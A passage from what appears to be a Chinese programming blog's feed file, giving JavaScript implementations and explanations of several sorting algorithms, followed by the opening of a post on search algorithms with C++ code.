class="title">shellSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> gap = <span class="built_in">Math</span>.floor(len / <span class="number">2</span>); gap &gt; <span class="number">0</span>; gap = <span class="built_in">Math</span>.floor(gap / <span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="comment">// 注意：这里和动图演示的不一样，动图是分组执行，实际操作是多个分组交替执行</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = gap; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> j = i;</span><br><span class="line">            <span class="keyword">var</span> current = arr[i];</span><br><span class="line">            <span class="keyword">while</span> (j - gap &gt;= <span class="number">0</span> &amp;&amp; current &lt; arr[j - gap]) &#123;</span><br><span class="line">                 arr[j] = arr[j - gap];</span><br><span class="line">                 j = j - gap;</span><br><span class="line">            &#125;</span><br><span class="line">            arr[j] = current;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>算法分析:</strong></p><p>希尔排序的核心在于间隔序列的设定。既可以提前设定好间隔序列，也可以动态的定义间隔序列。动态定义间隔序列的算法是《算法（第4版）》的合著者Robert Sedgewick提出的。　</p><h3 id="归并排序（Merge-Sort）"><a href="#归并排序（Merge-Sort）" class="headerlink" title="归并排序（Merge Sort）"></a>归并排序（Merge Sort）</h3><p>归并排序是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为2-路归并。 </p><p><strong>算法描述:</strong></p><ul><li>把长度为n的输入序列分成两个长度为n/2的子序列；</li><li>对这两个子序列分别采用归并排序；</li><li>将两个排序好的子序列合并成一个最终的排序序列。</li></ul><p><strong>动图演示:</strong></p><img src="/2018/07/21/2018-07-21-十大排序算法/pic5.gif"><p><strong>代码实现:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.length;</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> middle = <span class="built_in">Math</span>.floor(len / <span class="number">2</span>),</span><br><span class="line">        left = arr.slice(<span class="number">0</span>, middle),</span><br><span class="line">        right = arr.slice(middle);</span><br><span class="line">    <span class="keyword">return</span> merge(mergeSort(left), mergeSort(right));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = [];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> (left.length&gt;<span class="number">0</span> &amp;&amp; right.length&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (left[<span class="number">0</span>] &lt;= right[<span class="number">0</span>]) &#123;</span><br><span class="line">            result.push(left.shift());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result.push(right.shift());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> (left.length)</span><br><span class="line">        result.push(left.shift());</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> (right.length)</span><br><span class="line">        result.push(right.shift());</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>算法分析:</strong></p><p>归并排序是一种稳定的排序方法。和选择排序一样，归并排序的性能不受输入数据的影响，但表现比选择排序好的多，因为始终都是O(nlogn）的时间复杂度。代价是需要额外的内存空间。</p><h3 id="快速排序（Quick-Sort）"><a href="#快速排序（Quick-Sort）" class="headerlink" title="快速排序（Quick Sort）"></a>快速排序（Quick Sort）</h3><p>快速排序的基本思想：通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序。</p><p><strong>算法描述:</strong></p><p>快速排序使用分治法来把一个串（list）分为两个子串（sub-lists）。具体算法描述如下：</p><ul><li>从数列中挑出一个元素，称为 “基准”（pivot）；</li><li>重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；</li><li>递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序。</li></ul><p><strong>动图演示:</strong></p><img src="/2018/07/21/2018-07-21-十大排序算法/pic6.gif"><p><strong>代码实现:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quickSort</span>(<span class="params">arr, left, right</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.length,</span><br><span class="line">        partitionIndex,</span><br><span class="line">        left = <span class="keyword">typeof</span> left != <span class="string">'number'</span> ? <span class="number">0</span> : left,</span><br><span class="line">        right = <span class="keyword">typeof</span> right != <span class="string">'number'</span> ? len - <span class="number">1</span> : right;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">        partitionIndex = partition(arr, left, right);</span><br><span class="line">        quickSort(arr, left, partitionIndex<span class="number">-1</span>);</span><br><span class="line">        quickSort(arr, partitionIndex+<span class="number">1</span>, right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">partition</span>(<span class="params">arr, left ,right</span>) </span>&#123;     <span class="comment">// 分区操作</span></span><br><span class="line">    <span class="keyword">var</span> pivot = left,                      <span class="comment">// 设定基准值（pivot）</span></span><br><span class="line">        index = pivot + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = index; i &lt;= right; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &lt; arr[pivot]) &#123;</span><br><span class="line">            swap(arr, i, index);</span><br><span class="line">            index++;</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">    swap(arr, pivot, index - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> index<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">arr, i, j</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> temp = arr[i];</span><br><span class="line">    arr[i] = arr[j];</span><br><span class="line">    arr[j] = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="堆排序（Heap-Sort）"><a href="#堆排序（Heap-Sort）" class="headerlink" title="堆排序（Heap Sort）"></a>堆排序（Heap Sort）</h3><p>堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。</p><p><strong>算法描述:</strong></p><ul><li>将初始待排序关键字序列(R1,R2….Rn)构建成大顶堆，此堆为初始的无序区；</li><li>将堆顶元素R[1]与最后一个元素R[n]交换，此时得到新的无序区(R1,R2,……Rn-1)和新的有序区(Rn),且满足R[1,2…n-1]&lt;=R[n]；</li><li>由于交换后新的堆顶R[1]可能违反堆的性质，因此需要对当前无序区(R1,R2,……Rn-1)调整为新堆，然后再次将R[1]与无序区最后一个元素交换，得到新的无序区(R1,R2….Rn-2)和新的有序区(Rn-1,Rn)。不断重复此过程直到有序区的元素个数为n-1，则整个排序过程完成。</li></ul><p><strong>动图演示:</strong></p><img src="/2018/07/21/2018-07-21-十大排序算法/pic7.gif"><p><strong>代码实现:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> len;    <span class="comment">// 因为声明的多个函数都需要数据长度，所以把len设置成为全局变量</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildMaxHeap</span>(<span class="params">arr</span>) </span>&#123;   <span class="comment">// 建立大顶堆</span></span><br><span class="line">    len = arr.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="built_in">Math</span>.floor(len/<span class="number">2</span>); i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        heapify(arr, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">heapify</span>(<span class="params">arr, i</span>) </span>&#123;     <span class="comment">// 堆调整</span></span><br><span class="line">    <span class="keyword">var</span> left = <span class="number">2</span> * i + <span class="number">1</span>,</span><br><span class="line">        right = <span class="number">2</span> * i + <span class="number">2</span>,</span><br><span class="line">        largest = i;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (left &lt; len &amp;&amp; arr[left] &gt; arr[largest]) &#123;</span><br><span class="line">        largest = left;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (right &lt; len &amp;&amp; arr[right] &gt; arr[largest]) &#123;</span><br><span class="line">        largest = right;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (largest != i) &#123;</span><br><span class="line">        swap(arr, i, largest);</span><br><span class="line">        heapify(arr, largest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">arr, i, j</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> temp = arr[i];</span><br><span class="line">    arr[i] = arr[j];</span><br><span class="line">    arr[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">heapSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    buildMaxHeap(arr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = arr.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        swap(arr, <span class="number">0</span>, i);</span><br><span class="line">        len--;</span><br><span class="line">        heapify(arr, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="计数排序（Counting-Sort）"><a href="#计数排序（Counting-Sort）" class="headerlink" title="计数排序（Counting Sort）"></a>计数排序（Counting Sort）</h3><p>计数排序不是基于比较的排序算法，其核心在于将输入的数据值转化为键存储在额外开辟的数组空间中。 作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数。</p><p><strong>算法描述:</strong></p><ul><li>找出待排序的数组中最大和最小的元素；</li><li>统计数组中每个值为i的元素出现的次数，存入数组C的第i项；</li><li>对所有的计数累加（从C中的第一个元素开始，每一项和前一项相加）；</li><li>反向填充目标数组：将每个元素i放在新数组的第C(i)项，每放一个元素就将C(i)减去1。</li></ul><p><strong>动图演示:</strong></p><img src="/2018/07/21/2018-07-21-十大排序算法/pic8.gif"><p><strong>代码实现:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">countingSort</span>(<span class="params">arr, maxValue</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> bucket = <span class="keyword">new</span> <span class="built_in">Array</span>(maxValue + <span class="number">1</span>),</span><br><span class="line">        sortedIndex = <span class="number">0</span>;</span><br><span class="line">        arrLen = arr.length,</span><br><span class="line">        bucketLen = maxValue + <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrLen; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!bucket[arr[i]]) &#123;</span><br><span class="line">            bucket[arr[i]] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bucket[arr[i]]++;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; bucketLen; j++) &#123;</span><br><span class="line">        <span class="keyword">while</span>(bucket[j] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            arr[sortedIndex++] = j;</span><br><span class="line">            bucket[j]--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>算法分析:</strong></p><p>计数排序是一个稳定的排序算法。当输入的元素是 n 个 0到 k 之间的整数时，时间复杂度是O(n+k)，空间复杂度也是O(n+k)，其排序速度快于任何比较排序算法。当k不是很大并且序列比较集中时，计数排序是一个很有效的排序算法。</p><h3 id="桶排序（Bucket-Sort）"><a href="#桶排序（Bucket-Sort）" class="headerlink" title="桶排序（Bucket Sort）"></a>桶排序（Bucket Sort）</h3><p>桶排序是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。桶排序 (Bucket sort)的工作的原理：假设输入数据服从均匀分布，将数据分到有限数量的桶里，每个桶再分别排序（有可能再使用别的排序算法或是以递归方式继续使用桶排序进行排）。</p><p><strong>算法描述:</strong></p><ul><li>设置一个定量的数组当作空桶；</li><li>遍历输入数据，并且把数据一个一个放到对应的桶里去；</li><li>对每个不是空的桶进行排序；</li><li>从不是空的桶里把排好序的数据拼接起来。 </li></ul><p><strong>图片演示:</strong></p><img src="/2018/07/21/2018-07-21-十大排序算法/pic9.png"><p><strong>代码实现:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bucketSort</span>(<span class="params">arr, bucketSize</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (arr.length === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> i;</span><br><span class="line">    <span class="keyword">var</span> minValue = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> maxValue = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arr[i] &lt; minValue) &#123;</span><br><span class="line">          minValue = arr[i];                <span class="comment">// 输入数据的最小值</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arr[i] &gt; maxValue) &#123;</span><br><span class="line">          maxValue = arr[i];                <span class="comment">// 输入数据的最大值</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 桶的初始化</span></span><br><span class="line">    <span class="keyword">var</span> DEFAULT_BUCKET_SIZE = <span class="number">5</span>;            <span class="comment">// 设置桶的默认数量为5</span></span><br><span class="line">    bucketSize = bucketSize || DEFAULT_BUCKET_SIZE;</span><br><span class="line">    <span class="keyword">var</span> bucketCount = <span class="built_in">Math</span>.floor((maxValue - minValue) / bucketSize) + <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">var</span> buckets = <span class="keyword">new</span> <span class="built_in">Array</span>(bucketCount);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; buckets.length; i++) &#123;</span><br><span class="line">        buckets[i] = [];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 利用映射函数将数据分配到各个桶中</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        buckets[<span class="built_in">Math</span>.floor((arr[i] - minValue) / bucketSize)].push(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    arr.length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; buckets.length; i++) &#123;</span><br><span class="line">        insertionSort(buckets[i]);                      <span class="comment">// 对每个桶进行排序，这里使用了插入排序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; buckets[i].length; j++) &#123;</span><br><span class="line">            arr.push(buckets[i][j]);                     </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>算法分析:</strong></p><p>桶排序最好情况下使用线性时间O(n)，桶排序的时间复杂度，取决与对各个桶之间数据进行排序的时间复杂度，因为其它部分的时间复杂度都为O(n)。很显然，桶划分的越小，各个桶之间的数据越少，排序所用的时间也会越少。但相应的空间消耗就会增大。 </p><h3 id="基数排序（Radix-Sort）"><a href="#基数排序（Radix-Sort）" class="headerlink" title="基数排序（Radix Sort）"></a>基数排序（Radix Sort）</h3><p>基数排序是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。</p><p><strong>算法描述:</strong></p><ul><li>取得数组中的最大数，并取得位数；</li><li>arr为原始数组，从最低位开始取每个位组成radix数组；</li><li>对radix进行计数排序（利用计数排序适用于小范围数的特点）；</li></ul><p><strong>动图演示:</strong></p><img src="/2018/07/21/2018-07-21-十大排序算法/pic10.gif"><p><strong>代码实现:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">radixSort</span>(<span class="params">arr, maxDigit</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> mod = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">var</span> dev = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; maxDigit; i++, dev *= <span class="number">10</span>, mod *= <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; arr.length; j++) &#123;</span><br><span class="line">            <span class="keyword">var</span> bucket = <span class="built_in">parseInt</span>((arr[j] % mod) / dev);</span><br><span class="line">            <span class="keyword">if</span>(counter[bucket]==<span class="literal">null</span>) &#123;</span><br><span class="line">                counter[bucket] = [];</span><br><span class="line">            &#125;</span><br><span class="line">            counter[bucket].push(arr[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> pos = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; counter.length; j++) &#123;</span><br><span class="line">            <span class="keyword">var</span> value = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span>(counter[j]!=<span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> ((value = counter[j].shift()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                      arr[pos++] = value;</span><br><span class="line">                &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>算法分析:</strong></p><p>基数排序基于分别排序，分别收集，所以是稳定的。但基数排序的性能比桶排序要略差，每一次关键字的桶分配都需要O(n)的时间复杂度，而且分配之后得到新的关键字序列又需要O(n)的时间复杂度。假如待排数据可以分为d个关键字，则基数排序的时间复杂度将是O(d*2n) ，当然d要远远小于n，因此基本上还是线性级别的。</p><p>基数排序的空间复杂度为O(n+k)，其中k为桶的数量。一般来说n&gt;&gt;k，因此额外空间需要大概n个左右。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>七大查找算法</title>
      <link href="/2018/07/20/2018-07-20-%E4%B8%83%E5%A4%A7%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/"/>
      <url>/2018/07/20/2018-07-20-%E4%B8%83%E5%A4%A7%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 查找是常用的基本运算 <i class="fa fa-quote-right"></i></p><a id="more"></a><h2 id="查找算法"><a href="#查找算法" class="headerlink" title="查找算法"></a>查找算法</h2><p>查找是在大量的信息中寻找一个特定的信息元素，在计算机应用中，查找是常用的基本运算，例如编译程序中符号表的查找。本文简单概括性的介绍了常见的七种查找算法，说是七种，其实二分查找、插值查找以及斐波那契查找都可以归为一类——插值查找。插值查找和斐波那契查找是在二分查找的基础上的优化查找算法。树表查找和哈希查找会在后续的博文中进行详细介绍。</p><h3 id="查找定义"><a href="#查找定义" class="headerlink" title="查找定义"></a>查找定义</h3><p>根据给定的某个值，在查找表中确定一个其关键字等于给定值的数据元素（或记录）。</p><h3 id="查找算法分类："><a href="#查找算法分类：" class="headerlink" title="查找算法分类："></a>查找算法分类：</h3><ol><li><p>静态查找和动态查找；注：静态或者动态都是针对查找表而言的。动态表指查找表中有删除和插入操作的表。</p></li><li><p>无序查找和有序查找。</p><ul><li>无序查找：被查找数列有序无序均可；</li><li>有序查找：被查找数列必须为有序数列。</li></ul></li></ol><h3 id="平均查找长度（Average-Search-Length，ASL）："><a href="#平均查找长度（Average-Search-Length，ASL）：" class="headerlink" title="平均查找长度（Average Search Length，ASL）："></a>平均查找长度（Average Search Length，ASL）：</h3><p>需和指定key进行比较的关键字的个数的期望值，称为查找算法在查找成功时的平均查找长度。</p><p>　　对于含有n个数据元素的查找表，查找成功的平均查找长度为：ASL = Pi*Ci的和。<br>　　Pi：查找表中第i个数据元素的概率。<br>　　Ci：找到第i个数据元素时已经比较过的次数。</p><h2 id="七大查找算法"><a href="#七大查找算法" class="headerlink" title="七大查找算法"></a>七大查找算法</h2><h3 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h3><p><strong>说明：顺序查找适合于存储结构为顺序存储或链接存储的线性表。</strong></p><p><strong>基本思想：</strong>顺序查找也称为线形查找，属于无序查找算法。从数据结构线形表的一端开始，顺序扫描，依次将扫描到的结点关键字与给定值k相比较，若相等则表示查找成功；若扫描结束仍没有找到关键字等于k的结点，表示查找失败。</p><p><strong>复杂度分析：</strong>　<br>查找成功时的平均查找长度为：（假设每个数据元素的概率相等） ASL = 1/n(1+2+3+…+n) = (n+1)/2 ;<br>当查找不成功时，需要n+1次比较，时间复杂度为O(n);<br>所以，<strong>顺序查找的时间复杂度为O(n)。</strong></p><p><strong>C++实现源码：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//顺序查找</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SequenceSearch</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> value, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">        <span class="keyword">if</span>(a[i]==value)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h3><p><strong>说明：元素必须是有序的，如果是无序的则要先进行排序操作。</strong></p><p><strong>基本思想：</strong>也称为是折半查找，属于有序查找算法。用给定值k先与中间结点的关键字比较，中间结点把线形表分成两个子表，若相等则查找成功；若不相等，再根据k与该中间结点关键字的比较结果确定下一步查找哪个子表，这样递归进行，直到查找到或查找结束发现表中没有这样的结点。</p><p><strong>复杂度分析：</strong>最坏情况下，关键词比较次数为log2(n+1)，且<strong>期望时间复杂度为O(log2n)</strong>；</p><p>注：<strong>折半查找的前提条件是需要有序表顺序存储，对于静态查找表，一次排序后不再变化，折半查找能得到不错的效率。但对于需要**</strong>频繁执行插入或删除操作的数据集来说，维护有序的排序会带来不小的工作量，那就不建议使用。——《大话数据结构》**</p><p><strong>C++实现源码：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 